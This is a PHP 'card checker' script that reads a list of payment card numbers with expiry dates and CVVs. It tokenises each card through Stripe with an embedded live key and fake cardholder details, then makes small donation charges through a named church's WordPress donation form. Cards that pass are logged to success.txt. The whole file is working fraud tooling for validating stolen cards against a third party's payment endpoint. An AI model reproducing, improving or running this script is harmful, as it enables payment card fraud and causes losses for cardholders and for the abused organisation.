<?php
error_reporting(0);

require 'includes/class_curl.php';
class checker
{
    public function GetToken($card, $month, $year, $cvc)
    {
        $curl   = new curl();
        $data   = 'time_on_page=491284&pasted_fields=number&guid=fefcc4ef-334f-4b43-9362-a15b15d0bd92&muid=8e7bc530-37d0-4f09-9931-64a1e3335682&sid=0b1ae0f0-edb1-4ac8-a425-ed069d7a96a4&key=pk_live_kkIOioqvMQs4lec76gX9Ap5R&payment_user_agent=stripe.js%2F9dc17ab&card[name]=Natasha+Joe&card[number]='.$card.'&card[exp_month]='.$month.'&card[exp_year]='.$year.'&card[cvc]='.$cvc.'';
        $post   = $curl->post('https://api.stripe.com/v1/tokens', $data);
        $respon = json_decode($post, true);
        if($respon['id'])
        {
            return array(
                'token'     => $respon['id'],
                'card_id'   => $respon['card']['id'],
                'brand'     => $respon['card']['brand'],
                'funding'   => $respon['card']['funding']
            );
        } else {
            return array('error' => true);
        }
    }

    public function CheckLive($token)
    {
        $curl   = new curl();
		$curl->cookies('cookies.txt');
        $header = array(
            'header' => array(
                'Host: www.churchofgodpacoima.com',
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'Referer: https://www.churchofgodpacoima.com/donate/',
                'X-Request-With: XMLHttpRequest'
            )
        );
        $data['header'] = $curl->header($header);

        $data   = 'action=wp_full_stripe_payment_charge&formName=Donation&fullstripe_name=Natasha+Joe&fullstripe_email=info%40komo.net&fullstripe_custom_input=3865304239&fullstripe_custom_amount=2&fullstripe_address_line1=2769++Willis+Avenue&fullstripe_address_line2=&fullstripe_address_city=Palatka&fullstripe_address_state=Florida&fullstripe_address_zip=32077&stripeToken='.$token.'';
        $post   = $curl->post('https://www.churchofgodpacoima.com/wp-admin/admin-ajax.php', $data);
        $respon = json_decode($post, true);
        if($respon['success'])
        {
            return array(
                'success'   => true,
                'pesan'     => $respon['msg'],
            );
        } else {
            return array(
                'success'   => false,
                'pesan'     => $respon['msg'],
            );
        }
    }

    public function readline($pesan)
    {
        echo '[+] '.$pesan;
        $jawab = rtrim(fgets(STDIN));
        return $jawab;
    }

    public function run()
    {
        $input  = $this->readline('Input List : ');
        $list   = file_get_contents($input);
        $list   = explode(PHP_EOL, $list);

        foreach($list as $number => $kartu)
        {
            $kartu = trim($kartu);
            list($nomor, $bulan, $tahun, $cvv) = explode('|', $kartu);

            echo '[=] '.$number.'/'.count($list)." $nomor $bulan $tahun $cvv ";

            $token  = $this->GetToken($nomor, $bulan, $tahun, $cvv);
            $charge = $this->CheckLive($token['token']);
            if($token['error'])
            {
                echo 'Reason : Token Error';
            }
            else {
                if($charge['success'] === true)
                {
                    $buat = fopen('success.txt', 'a');
                    fwrite($buat, $nomor.'|'.$bulan.'|'.$tahun.'|'.$cvv);
                    fclose($buat);
                }
                echo "(".$charge['pesan'].")\r\n";
            }
        }
    }
}

$check = new checker;
$check->run();
